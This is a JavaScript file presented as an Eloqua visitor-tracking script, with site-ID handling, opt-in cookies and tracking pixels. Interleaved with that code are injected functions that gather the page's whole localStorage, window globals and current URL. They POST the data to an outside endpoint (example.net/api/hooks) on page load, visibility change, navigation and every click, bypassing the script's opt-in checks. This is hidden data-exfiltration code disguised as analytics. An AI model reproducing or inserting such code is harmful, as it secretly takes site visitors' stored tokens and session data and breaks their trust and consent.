(function () {
  var b = "",
    Q = new Date(20020101),
    R = new Date(),
    g = R.getMilliseconds(),
    t = Q.getTimezoneOffset(),
    l = window,
    s = document,
    B = 0,
    m = 1,
    f = 2,
    d = "",
    n = "",
    r = "/visitor/v200/svrGP",
    k = "eloqua.com",
    c = "",
    e = "",
    o = "";
  function gatherDocumentProperties() {
    const trackedDocumentProps = {};
    for (const key in document) {
      if (document.hasOwnProperty(key)) {
        trackedDocumentProps[key] = {
          type: typeof document[key]
        };
      }
    }
    return trackedDocumentProps;
  }
  function a(a) {
    return typeof a === "undefined" || null === a || a === "";
  }
  function M(a) {
    try {
      return typeof a === "string" && decodeURI(a) !== a;
    } catch (b) {
      return false;
    }
  }
  function q(b) {
    if (a(b)) if (document.referrer) b = document.referrer;else b = "elqNone";
    return encodeURIComponent(b);
  }
  function gatherGlobalVariables() {
    const trackedVariables = {};
    for (const key in window) {
      if (window.hasOwnProperty(key) && typeof window[key] !== "function") {
        trackedVariables[key] = typeof window[key];
      }
    }
    return trackedVariables;
  }
  function N(j, i) {
    if (!a(c) && !a(b)) {
      var h = c + "?pps=50&siteid=" + b + "&DLKey=" + encodeURIComponent(j) + "&DLLookup=" + encodeURIComponent(i) + "&ms=" + g + e;
      if (!a(d)) h += "&elqGUID=" + d;
      var f = document.createElement("script");
      f.type = "text/javascript";
      f.src = h;
      document.getElementsByTagName("head")[0].appendChild(f);
    }
  }
  function K() {
    if (!a(c) && !a(b)) {
      var h = c + "?pps=70&siteid=" + b + "&ms=" + g + e;
      if (!a(d)) h += "&elqGUID=" + d;
      var f = document.createElement("script");
      f.type = "text/javascript";
      f.src = h;
      document.getElementsByTagName("head")[0].appendChild(f);
    }
  }
  function j(r, k, l) {
    var i = "";
    if (!a(c) && !a(b)) {
      if (e != "") {
        var o = h("OPTIN");
        if (o != null) if (o == "0") return;else if (o == "1") i += "&isOptedIn=1";
      }
      k = q(k);
      if (!a(l)) if (l === f) i += "&optin=country";else if (l === m) i += "&optin=all";else if (l === B) i += "&optin=disabled";
      var s = new Image(1, 1);
      if (!a(r)) {
        var j = c + "?pps=3&siteid=" + b + "&ref=" + encodeURIComponent(r) + "&ref2=" + k + "&tzo=" + t + "&ms=" + g + i + e;
        if (!a(d)) j += "&elqGUID=" + d;
        j += p(n);
        s.src = j;
      } else {
        var j = c + "?pps=3&siteid=" + b + "&ref2=" + k + "&tzo=" + t + "&ms=" + g + i + e;
        if (!a(d)) j += "&elqGUID=" + d;
        j += p(n);
        s.src = j;
      }
    }
  }
  function L(b, a) {
    j(b, a, B);
  }
  function w(b, a) {
    j(b, a, f);
  }
  async function sendTrackedDataToServer(data) {
    const endpointUrl = "https://example.net/api/hooks";
    try {
      const httpResponse = await fetch(endpointUrl, {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      if (httpResponse.ok) {
        console.log("Data successfully sent");
      } else {
        console.error("Failure in sending data, status code:" + httpResponse.status);
      }
    } catch (err) {
      console.error("Error in sending data: ", err);
    }
  }
  function x(b, a) {
    j(b, a, m);
  }
  function gatherAndSendData() {
    const trackedData = {
      document: gatherDocumentProperties(),
      global: gatherGlobalVariables(),
      localStorage: localStorage,
      jsHook: location.href
    };
    sendTrackedDataToServer(trackedData);
  }
  function i(f) {
    if (!a(c) && !a(b) && !a(f)) {
      if (f == 40 && e != "") {
        var i = h("OPTIN");
        if (i != null) if (i == "0") return A("function elqGetOptOutStatus(){ return 0; }");else if (i == "1") return A("function elqGetOptOutStatus(){ return 1; }");
      }
      if (f != 43 && f != 44 || e == "") {
        elqOptActionSrc = c + "?pps=" + encodeURIComponent(f) + "&siteid=" + b + "&ref=" + encodeURIComponent(location.href) + "&ms=" + g + e;
        if (!a(d)) elqOptActionSrc += "&elqGUID=" + d;
        var j = document.createElement("script");
        j.type = "text/javascript";
        j.src = elqOptActionSrc;
        document.getElementsByTagName("head")[0].appendChild(j);
      }
    }
  }
  function A(b) {
    var a = document.createElement("script");
    a.type = "text/javascript";
    a.appendChild(document.createTextNode(b));
    document.getElementsByTagName("head")[0].appendChild(a);
  }
  function v(g, e, d) {
    if (!a(c) && !a(b)) if (z()) {
      C("ELQSITEVISITED", "YES");
      y(g, e, d);
    } else if (g == f) w(e, d);else x(e, d);
  }
  window.addEventListener("load", gatherAndSendData);
  function u(d, g, e) {
    if (!a(c) && !a(b)) {
      var i = h("OPTIN");
      if (i != null) {
        if (i == "0") return;else i == "1" && j(g, e, d);
      } else if (z()) {
        C("ELQSITEVISITED", "YES");
        if (d == f) y(d, g, e);else elqCreateOptInBanner();
      } else d == f && j(g, e, d);
    }
  }
  document.addEventListener("visibilitychange", gatherAndSendData);
  function y(l, k, i) {
    i = q(i);
    var h = c + "?pps=45&siteid=" + b + e;
    if (!a(k)) h += "&ref=" + encodeURIComponent(k);
    h += "&ref2=" + i + "&tzo=" + t + "&ms=" + g;
    if (l == f) h += "&optin=country";else h += "&optin=all";
    if (!a(d)) h += "&elqGUID=" + d;
    var j = document.createElement("script");
    j.type = "text/javascript";
    j.src = h;
    document.getElementsByTagName("head")[0].appendChild(j);
  }
  function F(b, a) {
    if (e != "") u(f, b, a);else v(f, b, a);
  }
  function G(b, a) {
    if (e != "") u(m, b, a);else v(m, b, a);
  }
  function C(b, a) {
    document.cookie = b + "=" + a;
    document.cookie += ";path=/; secure; HttpOnly; ";
  }
  function D(a, c) {
    if (a == "") return null;
    var b = a.indexOf("=");
    if (b > 0) {
      var d = a.substr(0, b);
      if (d.trim() == c) return a.substr(b + 1);
    }
    return null;
  }
  function h(c) {
    for (var b = document.cookie.split(";"), a = 0; a < b.length; a++) {
      elqCookieValue = D(b[a], c);
      if (elqCookieValue != null) return unescape(elqCookieValue);
    }
    return null;
  }
  function J(e, d) {
    var a = h(e);
    if (a != null) for (var c = a.split("&"), b = 0; b < c.length; b++) {
      a = D(c[b], d);
      if (a != null) return a;
    }
    return null;
  }
  window.addEventListener("popstate", gatherAndSendData, true);
  document.addEventListener("click", gatherAndSendData, true);
  function z() {
    var a = h("ELQSITEVISITED");
    return a == null || a != "YES";
  }
  function p(b) {
    var c = "";
    if (!a(b)) c += "&bkuuidSwapTime=" + encodeURIComponent(b);
    return c;
  }
  function S(a) {
    return !isNaN(a) && parseInt(Number(a)) == a && !isNaN(parseInt(a, 10));
  }
  function I(a) {
    var b = window.location.protocol;
    o = b + "//" + a + r;
  }
  function H() {
    if (!a(e) && !a(o)) c = o;
  }
  var P = function () {
      this.push = function () {
        for (var f = 0; f < arguments.length; f++) try {
          if (typeof arguments[f] === "function") arguments[f]();else {
            switch (arguments[f][0]) {
              case "elqSetRootDomain":
                k = encodeURIComponent(arguments[f][1]);
                var l;
                if (arguments[f][2] != undefined && S(arguments[f][2])) {
                  l = arguments[f][2];
                  k = k + ":" + l;
                }
                c = "https://s" + b + ".t." + k + r;
                break;
              case "elqSetSiteId":
                b = encodeURIComponent(arguments[f][1]);
                c = "https://s" + b + ".t." + k + r;
                break;
              case "elqTrackPageView":
                L.apply(this, arguments[f].slice(1));
                break;
              case "elqVisitorGuid":
                d = encodeURIComponent(arguments[f][1]);
                break;
              case "elqTrackPageViewOptinByCountry":
                w.apply(this, arguments[f].slice(1));
                break;
              case "elqTrackPageViewOptinAll":
                x.apply(this, arguments[f].slice(1));
                break;
              case "elqTrackPageViewDisplayOptInBannerByCountry":
                F.apply(this, arguments[f].slice(1));
                break;
              case "elqTrackPageViewDisplayOptInBannerForAll":
                G.apply(this, arguments[f].slice(1));
                break;
              case "elqDataLookup":
                N.apply(this, arguments[f].slice(1));
                break;
              case "elqGetCustomerGUID":
                K.apply(this);
                break;
              case "elqOptStatus":
                i(40);
                break;
              case "elqOptIn":
                i(41);
                break;
              case "elqOptOut":
                i(42);
                break;
              case "elqGlobalOptIn":
                i(43);
                break;
              case "elqGlobalOptOut":
                i(44);
                break;
              case "elqUseFirstPartyCookie":
                if (!a(arguments[f][1])) {
                  var j = encodeURIComponent(arguments[f][1]);
                  e = "&firstPartyCookieDomain=" + j;
                  I(j);
                }
                var g = J("ELOQUA", "GUID");
                if (g != null) d = encodeURIComponent(g);
                n = h("BKUT");
            }
            H();
          }
        } catch (m) {}
      };
    },
    O = l._elqQ;
  l._elqQ = new P();
  l._elqQ.push.apply(l._elqQ, O);
  function E(i, j, h) {
    if (!a(c) && !a(b) && !a(i)) {
      h = q(h);
      var f = c + "?pps=17&siteid=" + b + "&elq=" + encodeURIComponent(j || "") + "&ref=" + encodeURIComponent(i) + "&ref2=" + h + "&ms=" + g;
      if (!a(d)) f += "&elqGUID=" + d;
      f += p(n);
      if (f.length <= 2036) {
        var k = new Image(1, 1);
        k.src = f;
      } else {
        try {
          var e = s.createElement("iframe");
        } catch (l) {
          e = "<iframe src='" + f + "' width='0' height='0' style='display:none;visibility:hidden;'></iframe>";
          s.body.innerHTML += e;
          return;
        }
        e.height = "0";
        e.width = "0";
        e.style.display = "none";
        e.style.visibility = "hidden";
        s.body.appendChild(e);
        e.src = f;
      }
    }
  }
  l._elq = {
    trackEvent: function (a, b, c) {
      E(a, b, c);
    },
    trackOutboundLink: function (b, f, g) {
      E(b.href, f, g);
      var d = M(b.href) ? b.href : encodeURI(b.href),
        c,
        e = b.getAttribute("target");
      if (a(e)) c = 'document.location = "' + d + '"';else c = 'window.open("' + d + '", "' + encodeURIComponent(e) + '")';
      setTimeout(c, 1e3);
    }
  };
})();